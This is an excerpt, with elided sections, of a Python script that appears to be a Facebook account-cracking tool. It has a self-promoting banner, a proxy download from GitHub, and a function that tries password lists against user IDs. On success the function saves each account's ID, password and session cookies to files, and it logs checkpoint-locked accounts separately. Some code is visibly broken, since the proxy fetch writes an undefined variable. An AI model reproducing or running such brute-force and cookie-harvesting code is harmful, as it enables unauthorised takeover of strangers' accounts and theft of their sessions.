...
os.system('xdg-open https://www.facebook.com/Rolex.father.88')

try:
    prox= requests.get('https://raw.githubusercontent.com/trt-Fire/data/main/proxies.txt').text
    open('proxies.txt','w').write(proxies)
except Exception as e:
    print('\x1b[1;92m[√] PLEASE WAIT CHECKING RISHAV CHHETRI UPDATE...')
...
\033[1;35m[•] CREATED BY  :   RISHAV EXE
\033[1;32m[•] STYLE       :   RISHAV DUN HONI!!
\033[1;33m[•] WHAT APPS   :   +97798********
\033[1;35m[•] FACEBOOK    :   RISHAV CHHETRI
\033[38;5;208m[•] VERSION     :   0.1

{WHITE}================================================
   \33[37;41m\t ALWAYS HERO HONI\33[0;m
{WHITE}=================================================""")
def linex():
    print('\033[1;37m----------------------------------------------')
def clear():
...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                       ...
                       #os.system('xdg-open https://www.facebook.com/Aashish.Dona')
                        if xd in ['1','01']:
                                clear()
                                
                                print(' File banayera YESTO name haal:  /sdcard/File.trt.etc..')
                                linex()
...
def pak():
                ...
                linex()
                input(' PRESS ENTER TO BACK ')
                #os.system('python RISHAV.py')
#------
def ffb(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [RISHAV-RUNING] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [LEGEND-RISHAV-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/RISHAV-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/RISHAV-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                    ...
                                    #    print('\r\r\x1b[1;31m [RISHAV-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/RISHAV-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
